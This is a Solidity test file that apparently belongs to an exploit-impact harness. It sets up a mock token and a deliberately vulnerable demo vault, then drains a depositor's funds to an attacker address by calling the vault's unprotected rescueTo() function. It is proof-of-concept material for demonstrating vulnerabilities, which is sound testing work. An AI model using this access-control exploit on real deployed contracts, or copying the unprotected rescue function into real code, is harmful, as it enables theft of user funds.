// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ImpactProof} from "../src/ImpactProof.sol";
import {LeakyVault} from "../../demo-target/LeakyVault.sol";

contract Tok {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        require(balanceOf[f] >= a && allowance[f][msg.sender] >= a, "no");
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
    function transfer(address t, uint256 a) external returns (bool) {
        require(balanceOf[msg.sender] >= a, "bal");
        balanceOf[msg.sender] -= a; balanceOf[t] += a; return true;
    }
}

/** Attacker calls the unprotected rescueTo() and walks off with the vault. */
contract LeakyTheft is ImpactProof {
    LeakyVault vault; Tok tok;
    address depositor = address(0xD1);
    address atk       = address(0xA77ACC);

    function setUp() public {
        tok = new Tok();
        vault = new LeakyVault(address(tok));
        tok.mint(depositor, 1_000e6);
        vm.startPrank(depositor);
        tok.approve(address(vault), type(uint256).max);
        vault.deposit(1_000e6);
        vm.stopPrank();
    }

    function target()   public view override returns (address) { return address(vault); }
    function asset()    public view override returns (address) { return address(tok); }
    function victim()   public view override returns (address) { return depositor; }
    function attacker() public view override returns (address) { return atk; }

    function exploit() public override { vault.rescueTo(atk); }

    function withdraw(address who) public override {
        uint256 b = vault.balance(who);
        vm.prank(who);
        vault.withdraw(b);
    }
}
